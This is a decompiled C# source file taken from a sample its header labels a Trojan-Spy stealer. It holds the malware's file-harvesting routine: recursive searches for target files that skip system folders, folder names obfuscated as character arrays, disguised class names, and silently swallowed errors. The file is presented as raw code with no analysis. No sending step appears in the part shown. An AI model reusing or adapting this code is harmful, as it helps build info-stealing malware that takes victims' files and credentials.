// Decompiled with JetBrains decompiler
// Type: SystemNetSpnDictionaryE
// Assembly: Pursuits, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5AE29391-E6B0-4A11-8563-A9AF244B152D
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-Spy.MSIL.Stealer.gen-f5d5176d0ac8a6c9093f39208d3aff397cce06017bbf0f2e4fee86a5ce09a398.exe

using System;
using System.Collections.Generic;
using System.IO;

public static class SystemNetSpnDictionaryE
{
  public static List<SystemNetConfigurationMailSettingsSectionGroupg> Search(
    params MicrosoftWinNativeMethodsMEMORYBASICINFORMATIONd[] scanners)
  {
    List<SystemNetConfigurationMailSettingsSectionGroupg> settingsSectionGroupgList = new List<SystemNetConfigurationMailSettingsSectionGroupg>();
    try
    {
      foreach (MicrosoftWinNativeMethodsMEMORYBASICINFORMATIONd scanner in scanners)
      {
        try
        {
          foreach (SystemDataXSDSchemaNameTypeE scannerArg in scanner.Id3())
          {
            try
            {
              foreach (FileInfo file in new DirectoryInfo(scannerArg.Id1).GetFiles(scannerArg.Id2, scannerArg.Id3 ? SearchOption.AllDirectories : SearchOption.TopDirectoryOnly))
              {
                try
                {
                  settingsSectionGroupgList.Add(new SystemNetConfigurationMailSettingsSectionGroupg(file.FullName)
                  {
                    Id4 = scanner.Id2(scannerArg, file),
                    Id5 = string.IsNullOrWhiteSpace(scanner.Id1) ? scannerArg.Id5 : scanner.Id1
                  });
                }
                catch (Exception ex)
                {
                }
              }
            }
            catch
            {
            }
          }
        }
        catch
        {
        }
      }
    }
    catch
    {
    }
    return settingsSectionGroupgList;
  }

  public static List<string> FindPaths(
    string baseDirectory,
    int maxLevel = 4,
    int level = 1,
    params string[] files)
  {
    List<string> stringList = new List<string>()
    {
      new string(new char[9]
      {
        '\\',
        'W',
        'i',
        'n',
        'd',
        'o',
        'w',
        's',
        '\\'
      }),
      new string(new char[15]
      {
        '\\',
        'P',
        'r',
        'o',
        'g',
        'r',
        'a',
        'm',
        ' ',
        'F',
        'i',
        'l',
        'e',
        's',
        '\\'
      }),
      new string(new char[21]
      {
        '\\',
        'P',
        'r',
        'o',
        'g',
        'r',
        'a',
        'm',
        ' ',
        'F',
        'i',
        'l',
        'e',
        's',
        ' ',
        '(',
        'x',
        '8',
        '6',
        ')',
        '\\'
      }),
      new string(new char[14]
      {
        '\\',
        'P',
        'r',
        'o',
        'g',
        'r',
        'a',
        'm',
        ' ',
        'D',
        'a',
        't',
        'a',
        '\\'
      })
    };
    List<string> paths = new List<string>();
    if (files != null && files.Length != 0)
    {
      if (level <= maxLevel)
      {
        try
        {
          foreach (string directory in Directory.GetDirectories(baseDirectory))
          {
            bool flag1 = false;
            foreach (string str in stringList)
            {
              if (directory.Contains(str))
              {
                flag1 = true;
                break;
              }
            }
            if (!flag1)
            {
              try
              {
                DirectoryInfo directoryInfo = new DirectoryInfo(directory);
                FileInfo[] files1 = directoryInfo.GetFiles();
                bool flag2 = false;
                for (int index1 = 0; index1 < files1.Length && !flag2; ++index1)
                {
                  for (int index2 = 0; index2 < files.Length && !flag2; ++index2)
                  {
                    string file = files[index2];
                    FileInfo fileInfo = files1[index1];
                    string name = fileInfo.Name;
                    if (file == name)
                    {
                      flag2 = true;
                      paths.Add(fileInfo.FullName);
                    }
                  }
                }
                foreach (string path in SystemNetSpnDictionaryE.FindPaths(directoryInfo.FullName, maxLevel, level + 1, files))
                {
                  if (!paths.Contains(path))
                    paths.Add(path);
                }
              }
              catch
              {
              }
            }
          }
        }
        catch
        {
        }
        return paths;
      }
    }
    return paths;
  }
}
